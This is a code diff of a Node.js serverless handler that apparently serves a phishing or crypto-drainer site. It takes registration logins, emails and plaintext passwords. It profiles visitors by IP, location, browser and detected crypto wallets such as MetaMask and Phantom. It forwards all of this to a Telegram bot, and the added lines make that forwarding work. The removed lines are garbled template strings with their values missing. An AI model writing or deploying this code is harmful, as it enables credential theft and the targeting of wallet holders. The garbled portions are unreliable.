@@ -12,12 +12,12 @@ function sendTelegram(text) {
     console.warn('CHAT_ID not set, skipping telegram send');
     return Promise.resolve();
   }
-  const payload = JSON.stringify({ chat_id: CHAT_ID, text, disable_web_page_preview: true });
+  const payload = JSON.stringify({ chat_id: CHAT_ID, text: text, disable_web_page_preview: true });
   return new Promise((resolve, reject) => {
     const req = https.request(
       {
         hostname: 'api.telegram.org',
-        path: /bot/sendMessage,
+        path: '/bot' + BOT_TOKEN + '/sendMessage',
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
       },
@@ -41,18 +41,17 @@ function getIP(req) {
   return req.socket.remoteAddress || 'unknown';
 }
 
-function parseSystem(ua = '') {
-  const u = ua.toLowerCase();
-  if (u.includes('iphone') || u.includes('ipad')) return 'iOS';
-  if (u.includes('android')) return 'Android';
-  if (u.includes('mac os')) return 'Mac 🍏';
-  if (u.includes('windows')) return 'Windows';
-  if (u.includes('linux')) return 'Linux';
+function parseSystem(ua) {
+  ua = (ua || '').toLowerCase();
+  if (ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
+  if (ua.includes('android')) return 'Android';
+  if (ua.includes('mac os')) return 'Mac 🍏';
+  if (ua.includes('windows')) return 'Windows';
+  if (ua.includes('linux')) return 'Linux';
   return 'Unknown';
 }
 
 module.exports = async (req, res) => {
-  // CORS для сайта
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -62,7 +61,7 @@ module.exports = async (req, res) => {
 
   let body = req.body;
   if (typeof body === 'string') {
-    try { body = JSON.parse(body); } catch { body = {}; }
+    try { body = JSON.parse(body); } catch (e) { body = {}; }
   }
   if (!body) body = {};
 
@@ -73,17 +72,17 @@ module.exports = async (req, res) => {
 
   let location = body.location || 'unknown';
   if (city && country) {
-    location = ${city}, ;
+    location = city + ', ' + country;
   } else if (country) {
     location = country;
   } else if (ip && ip !== 'unknown' && !ip.startsWith('127.') && !ip.startsWith('192.168')) {
     try {
       const controller = new AbortController();
       setTimeout(() => controller.abort(), 3000);
-      const r = await fetch(http://ip-api.com/json/?fields=city,country, { signal: controller.signal });
+      const r = await fetch('http://ip-api.com/json/' + ip + '?fields=city,country', { signal: controller.signal });
       const j = await r.json();
-      if (j && j.country) location = ${j.city ? j.city + ', ' : ''};
-    } catch {}
+      if (j && j.country) location = (j.city ? j.city + ', ' : '') + j.country;
+    } catch (e) {}
   }
 
   const now = new Date();
@@ -91,21 +90,21 @@ module.exports = async (req, res) => {
   const cleanLang = rawLang.split('-')[0].toLowerCase();
   const timeStr = body.time || now.toLocaleTimeString('en-GB', { hour12: false, timeZone: body.tz || 'UTC' });
 
-  // 1. REGISTRATION (Скриншот 2)
+  // 1. REGISTRATION (Screenshot 2)
   if (body.type === 'registration' || body.type === 'register' || body.password || body.pass) {
     const login = body.login || body.username || 'N/A';
     const email = body.email || 'N/A';
     const pass = body.pass || body.password || 'N/A';
 
     const text =
-      📝 NEW REGISTRATION (DB)\n +
-      -------------------\n +
-      👤 Login: \n +
-      📧 Email: \n +
-      🔐 Pass: \n +
-      -------------------\n +
-      🌍 IP: \n +
-      🏳️ Location: ;
+      '📝 NEW REGISTRATION (DB)\n' +
+      '-------------------\n' +
+      '👤 Login: ' + login + '\n' +
+      '📧 Email: ' + email + '\n' +
+      '🔐 Pass: ' + pass + '\n' +
+      '-------------------\n' +
+      '🌍 IP: ' + ip + '\n' +
+      '🏳️ Location: ' + location;
 
     try {
       await sendTelegram(text);
@@ -115,18 +114,18 @@ module.exports = async (req, res) => {
     return res.status(200).json({ ok: true });
   }
 
-  // 2. ACTION / CLICK (Скриншот 1)
+  // 2. ACTION / CLICK (Screenshot 1)
   if (body.type === 'action' || body.action) {
     const actionName = (body.action || 'CLICKED SIGN UP').toUpperCase();
-    const actionTitle = actionName.startsWith('👆') ? actionName : 👆 ;
+    const actionTitle = actionName.startsWith('👆') ? actionName : ('👆 ' + actionName);
 
     const text =
-      ${actionTitle}\n +
-      -------------------\n +
-      🌍 IP: \n +
-      🏳️ Location: \n +
-      🗣 Lang: \n +
-      ⏰ Time: ;
+      actionTitle + '\n' +
+      '-------------------\n' +
+      '🌍 IP: ' + ip + '\n' +
+      '🏳️ Location: ' + location + '\n' +
+      '🗣 Lang: ' + cleanLang + '\n' +
+      '⏰ Time: ' + timeStr;
 
     try {
       await sendTelegram(text);
@@ -136,7 +135,7 @@ module.exports = async (req, res) => {
     return res.status(200).json({ ok: true });
   }
 
-  // 3. VISIT (Обычный визит)
+  // 3. VISIT
   const system = body.system || parseSystem(ua);
   const walletsEmoji = body.wallets && body.wallets.length ? body.wallets.map(w => {
     const map = { phantom: '👻 Phantom', metamask: '🦊 MetaMask', trust: 'Trust', coinbase: 'Coinbase', rabby: 'Rabby', zerion: 'Zerion' };
@@ -145,15 +144,15 @@ module.exports = async (req, res) => {
   }).join(', ') : 'None';
 
   const text =
-    👑 New Visitor Info\n +
-    —————————————\n +
-    💻 System: \n +
-    👛 Wallets: \n +
-    🌍 IP: \n +
-    📍 Location: \n +
-    🗣 Lang: \n +
-    🌐 Browser: \n +
-    ⏰ Time:  ();
+    '👑 New Visitor Info\n' +
+    '—————————————\n' +
+    '💻 System: ' + system + '\n' +
+    '👛 Wallets: ' + walletsEmoji + '\n' +
+    '🌍 IP: ' + ip + '\n' +
+    '📍 Location: ' + location + '\n' +
+    '🗣 Lang: ' + cleanLang + '\n' +
+    '🌐 Browser: ' + ua + '\n' +
+    '⏰ Time: ' + timeStr + ' (' + (body.tz || 'UTC') + ')';
 
   try {
     await sendTelegram(text);
